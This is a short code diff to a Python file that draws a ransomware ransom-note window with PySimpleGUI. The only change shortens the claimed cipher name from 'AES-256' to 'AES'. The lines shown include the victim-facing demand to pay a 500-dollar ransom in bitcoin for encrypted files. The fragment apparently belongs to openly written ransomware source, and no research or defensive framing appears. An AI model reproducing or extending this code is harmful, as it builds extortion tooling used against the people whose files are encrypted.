@@ -4,7 +4,7 @@ import PySimpleGUI as sg
 class RansomNote(object):
     def __init__(self):
         sg.theme('DarkRed2')
-        layout = [[sg.Text('Attention your files have been encrypted under a strong\n encryption algorithm called AES-256', font='Helvetica 18')],
+        layout = [[sg.Text('Attention your files have been encrypted under a strong\n encryption algorithm called AES', font='Helvetica 18')],
                [sg.Text('')],
                [sg.Text('How can I recover my files?', font='bold')],
                [sg.Text('You must have to pay the 500$ ransom in bitcoins.',
